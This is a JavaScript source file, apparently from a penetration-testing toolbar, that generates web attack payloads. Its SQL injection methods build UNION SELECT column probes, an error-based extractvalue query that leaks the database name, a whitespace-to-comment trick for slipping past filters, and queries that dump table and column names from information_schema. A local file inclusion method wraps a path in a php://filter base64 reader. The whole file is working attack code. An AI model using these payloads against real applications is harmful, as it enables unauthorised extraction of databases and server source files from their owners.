var Payload = {}

Payload.SQLi = class {
  static unionSelect (value) {
    value = parseInt(value)
    if (isNaN(value) === true) {
      return ''
    }

    return 'union select ' +
      Array.from(Array(value + 1).keys()).slice(1).join(',')
  }

  static errorBased (value) {
    return 'extractvalue(0x0a,concat(0x0a,(select database())))'
  }

  static spaceToComment (value) {
    return value.replace(/[^\S\r\n]+/g, '/**/')
  }

  static dumpTables (value) {
    value = parseInt(value)
    if (isNaN(value) === true) {
      return ''
    }

    return 'union select group_concat(table_name)' + ((value > 1) ? ',' : '') +
      Array.from(Array(value + 1).keys()).slice(2).join(',') +
      ' from information_schema.tables where table_schema=database()'
  }

  static dumpColumns (value) {
    value = parseInt(value)
    if (isNaN(value) === true) {
      return ''
    }

    return 'union select group_concat(column_name)' + ((value > 1) ? ',' : '') +
      Array.from(Array(value + 1).keys()).slice(2).join(',') +
      ' from information_schema.columns where table_schema=database()'
  }
}

Payload.LFI = class {
  static phpWrapperBas64 (value) {
    return 'php://filter/convert.base64-encode/resource=' + value
  }
}
